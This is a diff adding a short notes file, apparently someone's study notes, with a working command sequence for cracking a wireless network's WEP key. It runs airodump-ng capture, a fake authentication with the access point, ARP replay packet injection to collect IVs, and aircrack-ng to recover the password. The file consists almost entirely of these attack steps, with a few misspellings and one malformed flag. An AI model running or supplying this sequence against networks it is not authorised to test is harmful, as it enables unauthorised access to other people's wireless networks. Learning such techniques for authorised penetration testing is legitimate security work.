@@ -1,0 +1,11 @@
+# Fake authetification Attack (when the network is not busy)
+# Force the AP to generate new Ivs. Assoctiate with the AP before launching the atack.
+airodump-ng --bssid BSSID -channel CHANNEL --write FILENAME MONITORMODEINTERFACE
+ifconfig (copy first 6 groups of characters after 'unspec', repplace '-' with ':') => MonitorModeMac
+aireplay-ng --fakeauth 0 -a [NetworkMac] -h [MonitorModeMac] [Interface]
+
+# Now we can communicate with the network and will perform packet injection with ARP. After generate and collect # enough data, we can crack the passwrod as above.
+
+aireplay-ng --arpreplay -b [NetworkMac] -h [MonitorModeMac] [Interface]
+aireplay-ng --fakeauth 0 -a [NetworkMac] -h [MonitorModeMac] [Interface] (associate with network again)
+aircrack-ng FILENAME (if failed, then requires more data)
